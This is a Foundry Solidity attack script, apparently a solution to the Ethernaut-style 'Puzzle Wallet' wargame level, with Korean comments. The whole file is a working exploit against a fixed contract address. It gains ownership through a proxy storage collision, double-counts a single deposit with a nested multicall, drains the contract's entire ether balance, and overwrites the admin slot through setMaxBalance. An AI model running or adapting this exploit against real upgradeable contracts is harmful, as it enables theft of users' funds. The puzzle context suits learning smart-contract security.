// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {IPuzzle} from "src/IPuzzle.sol";

contract AttackerScript is Script {

    IPuzzle target;

    function setUp() public {
        target = IPuzzle(0x789507BAecc143f6834437159bAd02cb9be8980E);
    }

    function run() public {
        vm.startBroadcast();

        // PuzzleWallet owner 획득
        target.proposeNewAdmin(msg.sender);
        target.addToWhitelist(msg.sender);

        // PuzzleWallet.multicall => 예금 잔액 조작
        bytes[] memory arrData = new bytes[](2);
        bytes memory data = abi.encodeWithSelector( // 첫번째
            IPuzzle.deposit.selector
        );
        arrData[0] = data;
        bytes[] memory temp = new bytes[](1);
        temp[0] = data;
        data = abi.encodeWithSelector( // 두번째
            IPuzzle.multicall.selector,
            temp
        );
        arrData[1] = data;
        target.multicall{ value : 0.002 ether}(arrData);

        console.log("my balance =", target.balances(msg.sender));
        console.log("all balance =", address(target).balance);

        // 출금
        target.execute(msg.sender, address(target).balance, "");

        // admin 획득
        target.setMaxBalance(uint256(uint160(msg.sender)));
        console.log("target.admin() =", target.admin());

        vm.stopBroadcast();
    }
}
